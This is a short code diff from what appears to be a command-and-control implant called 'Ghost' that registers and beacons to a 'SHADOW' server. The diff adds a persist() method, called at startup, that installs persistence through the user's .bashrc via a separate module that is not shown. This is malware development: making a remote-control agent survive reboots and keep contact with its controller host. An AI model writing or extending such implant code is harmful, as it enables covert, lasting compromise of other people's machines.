@@ -9,6 +9,8 @@
 #include "httpClient.hpp"
 #include "utils.hpp"
 
+#include "modules/persistence.hpp"
+
 class Ghost {
 private:
     std::string uuid;
@@ -50,6 +52,18 @@ public:
         }
 
         return false; 
+    }
+
+    void persist() {
+        // TOOD: chose from different persistence methods/try them one-by-one
+        // TODO: parametrize for builder
+        if (Persistence::bashrc() == 0) {
+            std::cout << "[!] GHOST persisted\n";
+
+            return;
+        }
+
+        std::cout << "ERROR with persistence\n";
     }
 
     void beacon() {
@@ -124,6 +138,8 @@ int main() {
     std::cout << "GHOST UP on \"" << OS_PLATFORM << "\"" << std::endl;
 
     Ghost ghost(SHADOW_IP, SHADOW_PORT);
+
+    ghost.persist();
 
     // try to register with SHADOW
     while (!ghost.registerGhost()) {
